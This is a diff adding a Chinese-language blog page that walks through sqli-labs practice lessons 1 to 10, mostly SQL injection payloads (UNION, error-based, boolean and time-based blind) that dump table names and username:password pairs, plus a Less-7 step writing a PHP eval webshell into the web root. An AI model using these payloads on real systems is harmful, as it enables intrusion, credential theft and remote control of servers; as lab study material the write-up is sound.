@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SQL实战 Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)UNION： 操作符用于合并两个或多个 SELECT 语句的结果集。 方法一：手工UNION联合查询注入根据报错信息，可以确定输入参数的内容被存放到一对单引号中间， 猜想：咱们输入的1在数据库中出现的位置为：select … from … where i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2022/02/14/SQL3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL实战 Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)UNION： 操作符用于合并两个或多个 SELECT 语句的结果集。 方法一：手工UNION联合查询注入根据报错信息，可以确定输入参数的内容被存放到一对单引号中间， 猜想：咱们输入的1在数据库中出现的位置为：select … from … where i">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:/Users/刘雨桐/AppData/Roaming/Typora/typora-user-images/image-20220218193735689.png">
+<meta property="og:image" content="https://img-blog.csdn.net/20180819112141792?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180820145444509?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="og:image" content="https://img-blog.csdn.net/20180821131646367?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70">
+<meta property="article:published_time" content="2022-02-14T12:42:58.640Z">
+<meta property="article:modified_time" content="2022-02-18T12:06:39.119Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/刘雨桐/AppData/Roaming/Typora/typora-user-images/image-20220218193735689.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-SQL3" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/02/14/SQL3/" class="article-date">
+  <time datetime="2022-02-14T12:42:58.640Z" itemprop="datePublished">2022-02-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL实战"><a href="#SQL实战" class="headerlink" title="SQL实战"></a>SQL实战</h1><p><img src="C:\Users\刘雨桐\AppData\Roaming\Typora\typora-user-images\image-20220218193735689.png" alt="image-20220218193735689"></p>
+<h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><p>UNION： 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
+<h5 id="方法一：手工UNION联合查询注入"><a href="#方法一：手工UNION联合查询注入" class="headerlink" title="方法一：手工UNION联合查询注入"></a>方法一：手工UNION联合查询注入</h5><p>根据报错信息，可以确定输入参数的内容被存放到一对单引号中间，</p>
+<p>猜想：咱们输入的1在数据库中出现的位置为：select … from … where id=’1’ ……，</p>
+<p>也可以查看sqli-lab中less-1的php文件可以看到，和猜想一致，</p>
+<p>多余的步骤不多说了，直接开始爆数据吧。</p>
+<p>注意 id=非正确值</p>
+<p><code>?id=-1&#39; union select 1,2,database() --+</code></p>
+<p>爆库payload</p>
+<p><code>?id=-1&#39; union select 1,2,database() --+</code><br>得到‘security’库名</p>
+<p>爆表payload</p>
+<p><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code><br>查到  emails,referers,uagents,users ，显然users是用户数据表</p>
+<p>爆列名（字段）payload</p>
+<p><code>?id=0&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p>爆值payload</p>
+<p><code>?id=0&#39; union select 1,2,group_concat(username,0x3a,password) from users--+</code><br>0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username。</p>
+<h5 id="方法二：手工报错型注入"><a href="#方法二：手工报错型注入" class="headerlink" title="方法二：手工报错型注入"></a>方法二：手工报错型注入</h5><p>检测报错型payload</p>
+<p><code>?id=1&#39; and 1=1--+   </code> //正确<br><code>?id=1&#39; and 1=2--+ </code>   //失败</p>
+<p>证明确实存在手工报错型注入，</p>
+<p>注意id=正确值</p>
+<p>爆表payload</p>
+<p><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</code></p>
+<p>爆列名（字段）payload</p>
+<p><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) --+</code></p>
+<p> 显然没有完全显示</p>
+<p>使用 and column_name not in (‘user_id’,’first_name’,’last_name’,’user’,’avatar’,’last_login’,’failed_login’) 来显示其他值：</p>
+<p>?id=1’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and column_name not in (‘user_id’,’first_name’,’last_name’,’user’,’avatar’,’last_login’,’failed_login’)))) –+<br>爆值payload</p>
+<p><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+</code></p>
+<p>同样使用not in显示其他值</p>
+<p><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not</code></p>
+<h3 id="Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#Less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><p>输入单引号，根据报错信息确定咱们输入的内容被原封不动的带入到数据库中，也可叫做数字型注入，</p>
+<p>就是，把第一题中id=1后面的单引号去掉，其它保持不变就行了，</p>
+<h4 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h4><p>输入单引号，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id=(‘1’) …，在第一题中id=1‘的后面单引号加上），其它保持不变就行了，</p>
+<h4 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h4><p>输入单引号，页面无任何变化，</p>
+<p>输入双引号，页面报错，</p>
+<p>根据报错信息判断出咱们输入的内容被放到一队双引号和圆括号中，</p>
+<p>猜想一下：select … from … where id=(”1”) …，把第一题中1后面的引号换成双引号加）就可以了。</p>
+<p>不再赘述</p>
+<h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><p><img src="https://img-blog.csdn.net/20180819112141792?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
+<p>看到这个报错信息，第一反应就是布尔型盲注、报错型注入、时间延迟型盲注了</p>
+<p>下面给出验证时间延迟型的盲注：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;</a> and sleep(5)–+</p>
+<p>发现明显延迟，说明猜测正确。接下来的思路是通过延迟，依次爆破数据库长度，数据库名，表名，列名，以及字段。</p>
+<p>布尔型和时间延迟型盲注建议采用sqlmap去跑。</p>
+<p>其实本题不能称作盲注，因为存在回显，真正的盲注时不存在回显的，只能根据浏览器加载页面情况，判定是否注入成功。</p>
+<p>一些专业术语的误用请见谅。</p>
+<h5 id="方法一：时间延迟型手工注入："><a href="#方法一：时间延迟型手工注入：" class="headerlink" title="方法一：时间延迟型手工注入："></a>方法一：时间延迟型手工注入：</h5><p>时间延迟型手工注入，正确会延迟，错误没有延迟。id无所谓，又不看回显，可以通过浏览器的刷新提示观察延迟情况，但是id正确的时候的回显有利于观察。</p>
+<p>时间延迟型和报错型payload核心部分的构造相同</p>
+<p>本方法中payload  =  ?id=1’ and if(报错型payload核心部分,sleep(5),1)–+</p>
+<p>爆库长payload</p>
+<p><code>?id=1&#39; and if(length(database())=8,sleep(5),1)--+</code></p>
+<p> 明显延迟，数据库长度为8.</p>
+<p>爆库名payload</p>
+<p><code>?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+</code></p>
+<p>明显延迟，数据库第一个字符为s，加下来以此增加left(database(),字符长度)中的字符长度，等号右边以此爆破下一个字符，正确匹配时会延迟。最终爆破得到left(database(),8)=’security’</p>
+<p>爆表名payload</p>
+<p><code>?id=1&#39; and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; ,sleep(5),1)--+</code><br>通过坚持不懈的测试，终于在limit 3,1 爆破出user表名为users.</p>
+<p>爆列名payload</p>
+<p><code>?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; ,sleep(5),1)--+</code><br>首先尝试定向爆破，以提高手工注入速度，修改limit x,1 中的x查询password是否存在表中，lucky的是limit 3,1的时候查到了password列，同样的方法查询username ，又一个lucky，接下来爆破字段的值。</p>
+<p>爆破值payload</p>
+<p><code>?id=1&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+ ?id=1&#39; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; ,sleep(5),1)--+</code><br> 按照id排序，这样便于对应。注意limit 从0开始.通过坚持不懈的尝试终于爆破到第一个用户的名字dumb，密码dumb，需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。</p>
+<p>还有下面的还几个用户没爆破，重复性的工作，我们技术人，应该少做，要学会如何在前人的基础上更近一层，前几天看了刘慈欣的《乡村教师》，感触很深，我们使用声波文字这样的载体传输信息，每秒传输几个字节，而且我们的存储体系很弱，这就很大程度阻止我们人类文明进程的发展速度的提高。</p>
+<p>所以要在更多的在前人的基础上创造新的东西。</p>
+<p>这种重复性的工作，不要多做。sql注入，人生苦短，快用sqlmap。</p>
+<h5 id="方法二，布尔型手工注入："><a href="#方法二，布尔型手工注入：" class="headerlink" title="方法二，布尔型手工注入："></a>方法二，布尔型手工注入：</h5><p>在布尔型注入中，正确会回显，错误没有回显，以此为依据逐字爆破，注意id=1</p>
+<p>手工注入时可使用例如left((select database()),1)&lt;’t’  这样的比较二分查找方法快速爆破。</p>
+<p>暴库payload</p>
+<p><code>?id=1&#39; and left((select database()),1)=&#39;s&#39;--+</code></p>
+<p>可以看&gt;’t’无回显，而&lt;’t’有回显。</p>
+<p>最终确定的库名为security。</p>
+<p>爆表paylaod</p>
+<p><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; --+</code><br>修改limit x,1和left中的位数限定数字，爆破到第一张表为referer，终于在第三张表爆破到user表，名为users。</p>
+<p>爆列名payload</p>
+<p><code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39; --+</code><br>定向爆破制定password为字段名，最后找到第4个字段为password，同理看看有没有usrname，最后到找到了，接下来只需要爆破这两个字段的值就完事了。</p>
+<p>爆字段payload</p>
+<p><code>?id=1&#39; and left((select password from users order by id limit 0,1),1)=&#39;d&#39; --+</code><br>用户名</p>
+<p><code>?id=1&#39; and left((select username from users order by id limit 0,1),1)=&#39;d&#39; --+</code><br>按照id排序，这样便于对应。注意limit 从0开始.最后爆破到第一个用户的名字dumb，密码dumb，需要注意的是，mysql对大小写不敏感，所以你不知道是Dumb 还是dumb。</p>
+<p>布尔型的盲注比较烦的的就是手工注入很麻烦，必须慢慢试。</p>
+<h5 id="方法三，使用concat聚合函数-用于将两个字符串连接起来，形成一个单一的字符串。"><a href="#方法三，使用concat聚合函数-用于将两个字符串连接起来，形成一个单一的字符串。" class="headerlink" title="方法三，使用concat聚合函数(用于将两个字符串连接起来，形成一个单一的字符串。)"></a>方法三，使用concat聚合函数(用于将两个字符串连接起来，形成一个单一的字符串。)</h5><p>参考资料：<a target="_blank" rel="noopener" href="http://www.2cto.com/article/201303/192718.html">http://www.2cto.com/article/201303/192718.html</a></p>
+<p>简单的说，使用聚合函数进行双注入查询时，会在错误信息中显示一部分错误信息。</p>
+<p>比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p>
+<p>例如select count(*), concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;<br>查询数据库版本，我在phpmyadmin中测试：</p>
+<p>可以看到测试的错误信息中出现了版本号。即构造双查询，比如派生表，使一个报错，另一个的结果就会出现在报错的信息中。废话不多说，想了解更详细的看链接的内容，下面进入正题。</p>
+<p>payload在concat()中构造</p>
+<p>爆库payload</p>
+<p><code>?id=-1&#39;union select count(*),count(*), concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code><br>//或者<br><code>?id=-1&#39;union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code><br>//注意本本方法具有随机性，原理待研究</p>
+<p>爆用户payload</p>
+<p><code>?id=-1&#39; union select count(*),1, concat(&#39;~&#39;,(select user()),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a--+</code><br>爆表名payload</p>
+<p><code>?id=-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code><br> 修改limit x,1 可以遍历表名，找到user这个表，猜测它存放username和password</p>
+<p>爆列名payload</p>
+<p><code>?id=-1&#39; union select count(*),1, concat(&#39;~&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code><br>  修改limit x,1 可以遍历列名，找到username和password列</p>
+<p>爆字段payload</p>
+<p><code>?id=-1&#39; union select count(*),1, concat(&#39;~&#39;,(select concat_ws(&#39;[&#39;,password,username) from users limit 1,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a--+</code></p>
+<p>修改limit x,1 可以显示第x个用户的password和username  （‘[’是分隔符）</p>
+<p>注入结束。</p>
+<h4 id="Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h4><p> 双引号字符型注入，上一题的单引号改成双引号就可以了,同样是两种方法：时间延迟型的手工盲注、报错型的手工盲注或者sqlmap，再有利用concat()几聚合数。</p>
+<p>步骤和第五题一样，不再赘述。</p>
+<h4 id="Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</h4><p>几次尝试，不难猜出注释符被过滤了，但是看看题目：less 7 GET - Dump into outfile - String （导出文件GET字符型注入）</p>
+<p>所以大概要使用文件导出。我投机取巧了，找了个简单题less-2直接注入拿到路径，方便导出。</p>
+<h5 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h5><p>winserver的iis默认路径c:\Inetpub\wwwroot</p>
+<p>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等</p>
+<p>apache 就…/var/www/htm，…/var/www/html/htdocs</p>
+<p>phpstudy 就是…\PhpStudy20180211\PHPTutorial\WWW\</p>
+<p>xammp 就是…\xampp\htdocs</p>
+<p>payload</p>
+<p><code>Less-2/?id=-1 union select 1,@@basedir,@@datadir --+</code></p>
+<p>注入less-7</p>
+<p>payload</p>
+<p><code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;F:\\WhiteFlie\\PhpStudy20180211\\PHPTutorial\\WWW\\sqli-labs\\ttt.php&quot;--+</code><br>php的一句话我就不多解释了。</p>
+<p>注意下这里的路径必须用 \</p>
+<p><img src="https://img-blog.csdn.net/20180820145444509?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
+<p>虽然回显报错，但是查看本地文件已经写入了ttt.php，接下来中国菜刀(有需要的可以给评论一下，Email给你)连接一下。</p>
+<p>连接之前最好用浏览器访问一下，相当于运行一下，否则可能连不上。</p>
+<p>地址：php一句话木马的地址，后面的口令就是刚才写的post里写的cmd，当然可以使用其他口令。</p>
+<p>本题是导出文件GET字符型注入，实际情况下，如果可扫描出phpmyadmin的后台，并且后台使用弱口令，也可以通过爆破进入后台，从后台注入文件。</p>
+<p>大致过程：</p>
+<p>再phpmyadmin的sql中执行命令：</p>
+<hr>
+<p>use test; //选择数据库为test<br>create table test(bbb varchar(64)); //在数据库中创建一个表test<br>insert into test values(“<?php @eval($_POST['cmd']);?>“); //在test中插入一条数据<br><?php @eval($_POST['cmd']);?> select * from test into outfile ‘一句话木马路径’; //将test中的数据导出到php文件</p>
+<p>use test; //选择数据库为test<br>create table test(bbb varchar(64)); //在数据库中创建一个表test<br>insert into test values(“<?php @eval($_POST['cmd']);?>“); //在test中插入一条数据<br><?php @eval($_POST['cmd']);?> select * from test into outfile ‘一句话木马路径’; //将test中的数据导出到php文件</p>
+<hr>
+<p>然后菜刀连接一下。</p>
+<p>再或者直接用sqlmap跑也是可以的，不在赘述。</p>
+<p>注入完成。</p>
+<p>PS：<br>需要说一下这个方法需要mysql数据库开启secure-file-priv写文件权限，否则不能写入文件。</p>
+<p>这是个坑，这里说一下方法，方便读者，不需要麻烦的再去找其他博客资料。</p>
+<p>如果你使用的时phpstudy，或者xammp请修改其自己的环境里的mysql配置文件。</p>
+<p>进入mysql安装目录，找到my.ini 修改里面的secure-file-priv参数</p>
+<p>如果发现没有secure_file_priv这个选项，直接再最后添加一个空的即可。</p>
+<p>如果引号中是一个文件路径的话，导入/出的文件路径会再这个路径下。</p>
+<h4 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h4><p>题目名字暴露一切，本来不想看的，又瞥到了，布尔型盲注，单引号，id=1回显，价格单引号不回显，构造一下验证是不是布尔型payload ?id=1’ and 1=1 –+ 回显了，证明没跑了。</p>
+<p>那就一步一步来吧，和less5一样的，根据回显判断。</p>
+<p>可以通过 &gt; &lt; 比较字符大小加速爆破</p>
+<p>暴库payload</p>
+<p>?id=1’ and left((select database()),1)=’s’–+<br>库名长度可使用?id=1’ and length(database())=8–+ 判断，同理表名字，段名等。</p>
+<p>最后得到库名?id=1’ and left((select database()),8)=’security’–+</p>
+<p>爆表，爆字段，爆值，流水操作，和less5的方法二，手工注入所有payload一摸一样，不再赘述。</p>
+<p>less5的方法二，时间型的注入一样能用，</p>
+<p>但是不知道为什么concat聚合函数这题用不了。</p>
+<p>注入完成。</p>
+<h4 id="Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)"></a>Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)</h4><p>不管怎么输入，回显总是you are …</p>
+<p><img src="https://img-blog.csdn.net/20180821131646367?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDIwNzQ3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p>
+<p>考虑时间型盲注，payload</p>
+<p>?id=1’ and sleep(3) –+<br>注意id=1，发现明显延迟，说明注入成功，接下来爆破就完了。</p>
+<p>这道题的payload构造和第五题的方法一是一样的，一些废话就不多说了，这里就列一下过程，完事儿。</p>
+<p>爆库payload</p>
+<p><code>?id=1&#39; and if(length(database())=4 , sleep(3), 1) --+</code><br>发现当?id=1’ and if(length(database())=8 , sleep(3), 1) –+时明显延迟，所以库名长为8</p>
+<p><code>?id=1&#39; and if(left(database(),1)=&#39;s&#39; , sleep(3), 1) --+</code><br>发现明显延迟说明库名第一个字符为 ‘s’</p>
+<p>继续爆破</p>
+<p><code>?id=1&#39; and if(left(database(),8)=&#39;security&#39; , sleep(3), 1) --+</code></p>
+<p>说明库名为 ‘security’</p>
+<p>爆表payload</p>
+<p><code>?id=1&#39; and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=&#39;r&#39; , sleep(3), 1) --+</code><br>使用limit x,1 查询第x个表名，和爆破库名一样，第一个表名为referer。终于，在第三个表爆到users这个表，显然是用户信息表。</p>
+<p>爆字段payload</p>
+<p>定向爆破password和username</p>
+<p><code>?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),8)=&#39;password&#39;, sleep(3), 1) --+</code><br><code>?id=1&#39; and if(left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 9,1),8)=&#39;username&#39;, sleep(3), 1) --+</code><br>，个人环境不同的可能表位置有差别。</p>
+<p>爆值payload</p>
+<p><code>?id=1&#39; and if(left((select password from users order by id limit 0,1),4)=&#39;dumb&#39; , sleep(3), 1) --+</code><br><code>?id=1&#39; and if(left((select username from users order by id limit 0,1),4)=&#39;dumb&#39; , sleep(3), 1) --+</code><br>爆破到第一个人的username：dumb，password：dumb。修改limit x,1 继续爆破其他用户，手工注入比较慢，可以使用sqlmap。</p>
+<p>注入结束。</p>
+<h3 id="Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a><strong>Less-10</strong> GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h3><p>基于时间的双引号盲注，只要把上一题Less-9的单引号改成双引号，一样的注入，不再赘述。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/02/14/SQL3/" data-id="ckzsdcr2f0000csv305bvgjxp" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/02/07/SQL2/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/02/14/SQL3/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/07/SQL2/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/06/SQL1/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/28/SQL/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/26/web8/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
